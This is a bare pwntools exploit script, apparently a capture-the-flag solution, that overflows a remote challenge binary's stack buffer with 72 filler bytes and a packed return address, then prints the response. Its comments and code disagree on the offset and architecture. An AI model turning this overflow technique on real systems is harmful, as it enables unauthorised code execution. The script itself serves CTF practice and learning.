## 0x00000000004011dd
## \0xdd\0x40
## Offset 80

#0x00000000004011e1
#\xe1\x11\x40

from pwn import *
import struct
import pwn

context(arch='i386', os='linux')

# p = process('./chal')
p = remote('gold.b01le.rs',4004)

offset = 72
buff = pwn.p64(0x00000000004011e1)

payload = b'A'* offset + buff

p.recvline()
p.sendline("AAA")
p.recvline()
p.sendline("AAA")
p.recvline()
p.sendline("AAA")
p.recvline()
p.sendline(payload)
p.recvline()
s = p.recvline()
print(s)